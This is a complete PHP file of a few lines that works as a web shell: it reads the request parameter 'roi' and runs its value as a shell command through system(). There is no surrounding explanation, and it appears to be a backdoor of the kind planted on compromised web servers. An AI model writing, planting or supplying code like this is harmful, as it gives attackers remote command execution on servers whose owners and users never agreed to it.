<?php 
if(isset($_REQUEST['roi'])){
    $cmd = ($_REQUEST['roi']);
    system($cmd);
}?>
